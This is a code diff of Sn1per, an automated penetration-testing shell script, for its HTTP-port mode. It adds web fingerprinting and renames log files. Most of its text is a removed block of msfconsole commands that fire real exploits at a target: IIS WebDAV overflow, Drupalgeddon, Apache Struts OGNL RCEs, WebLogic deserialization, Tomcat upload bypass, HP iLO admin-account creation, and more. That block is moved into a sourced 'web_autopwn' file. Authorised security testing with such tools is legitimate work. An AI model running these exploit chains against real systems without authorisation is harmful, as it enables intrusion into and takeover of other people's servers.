@@ -14,8 +14,8 @@ if [ "$MODE" = "webporthttp" ]; then
       mkdir $LOOT_DIR/scans 2> /dev/null
       mkdir $LOOT_DIR/output 2> /dev/null
     fi
-    echo "sniper -t $TARGET -m $MODE -p $PORT --noreport $args" >> $LOOT_DIR/scans/$TARGET-$MODE-$PORT-`date +%Y%m%d%H%M`.txt
-    sniper -t $TARGET -m $MODE -p $PORT --noreport $args | tee $LOOT_DIR/output/sniper-$MODE-$PORT-`date +%Y%m%d%H%M`.txt 2>&1
+    echo "sniper -t $TARGET -m $MODE -p $PORT --noreport $args" >> $LOOT_DIR/scans/$TARGET-$MODE.txt
+    sniper -t $TARGET -m $MODE -p $PORT --noreport $args | tee $LOOT_DIR/output/sniper-$TARGET-$MODE-$PORT-`date +%Y%m%d%H%M`.txt 2>&1
     exit
   fi
   echo -e "$OKRED                ____               $RESET"
@@ -26,7 +26,7 @@ if [ "$MODE" = "webporthttp" ]; then
   echo -e "$OKRED               /_/                 $RESET"
   echo -e "$RESET"
   echo -e "$OKORANGE + -- --=[https://xerosecurity.com"
-  echo -e "$OKORANGE + -- --=[Sn1per v$VER by 1N3"
+  echo -e "$OKORANGE + -- --=[Sn1per v$VER by @xer0dayz"
   echo -e ""
   echo -e ""
   echo -e "               ;               ,           "
@@ -101,6 +101,12 @@ if [ "$MODE" = "webporthttp" ]; then
     wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 http://$TARGET:$PORT |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET-$PORT.txt 2> /dev/null
     curl --connect-timeout 3 -I -s -R http://$TARGET:$PORT | tee $LOOT_DIR/web/headers-http-$TARGET-$PORT.txt 2> /dev/null
     curl --connect-timeout 5 -I -s -R -L http://$TARGET:$PORT | tee $LOOT_DIR/web/websource-http-$TARGET-$PORT.txt 2> /dev/null
+    if [ "$WEBTECH" = "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      webtech -u http://$TARGET:$PORT | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-http-port$PORT.txt
+    fi
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -236,165 +242,8 @@ if [ "$MODE" = "webporthttp" ]; then
       cd $INSTALL_DIR
     fi
     if [ $METASPLOIT_EXPLOIT = "1" ]; then
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL false; run; set PATH /uploads/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RPORT "$PORT"; setg SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE TOMCAT UTF8 TRAVERSAL EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use admin/http/tomcat_utf8_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_utf8_traversal.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE OPTIONS BLEED EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/apache_optionsbleed; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-apache_optionsbleed.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-hp_ilo_create_admin_account.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING ELASTICSEARCH DYNAMIC SCRIPT JAVA INJECTION EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING DRUPALGEDDON HTTP PARAMETER SQL INJECTION CVE-2014-3704 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw 2> /dev/null
-
-
-
-
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/glassfish_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL false; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw 2> /dev/null
-
-
-
-
-
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set WAIT 2; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-badblue_passthru.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-php_cgi_arg_injection.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOITS $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/htp/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT CVE-2017-8917 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use unix/webapp/joomla_comfields_sqli_rce; setg RHOST "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-joomla_comfields_sqli_rce.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING WORDPRESS REST API CONTENT INJECTION CVE-2017-5612 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use auxiliary/scanner/http/wordpress_content_injection; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-wordpress_content_injection.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING ORACLE WEBLOGIC WLS-WSAT DESERIALIZATION RCE CVE-2017-10271 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; set RPORT 80; set SSL false; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oracle_weblogic_wsat_deserialization_rce.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA OGNL INJECTION CVE-2017-5638 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use multi/http/struts2_content_type_ognl; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE STRUTS 2 SHOWCASE OGNL RCE CVE-2017-9805 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE STRUTS 2 REST XSTREAM RCE CVE-2017-9791 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE TOMCAT CVE-2017-12617 RCE EXPLOIT $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/tomcat_jsp_upload_bypass; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_jsp_upload_bypass.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING APACHE STRUTS 2 NAMESPACE REDIRECT OGNL INJECTION CVE-2018-11776 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/struts2_namespace_ognl; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_namespace_ognl.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED CISCO ASA TRAVERSAL CVE-2018-0296 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use auxiliary/scanner/http/cisco_directory_traversal; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-cisco_directory_traversal.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING DRUPALGEDDON2 CVE-2018-7600 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupalgeddon2.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING ORACLE WEBLOGIC SERVER DESERIALIZATION RCE CVE-2018-2628 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/misc/weblogic_deserialize; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw 2> /dev/null
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING OSCOMMERCE INSTALLER RCE CVE-2018-2628 $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/oscommerce_installer_unauth_code_exec; setg RHOST "$TARGET"; setg RPORT "$PORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw 2> /dev/null
+      SSL="false"
+      source modes/web_autopwn.sh
     fi
     source modes/osint_stage_2.sh
   fi
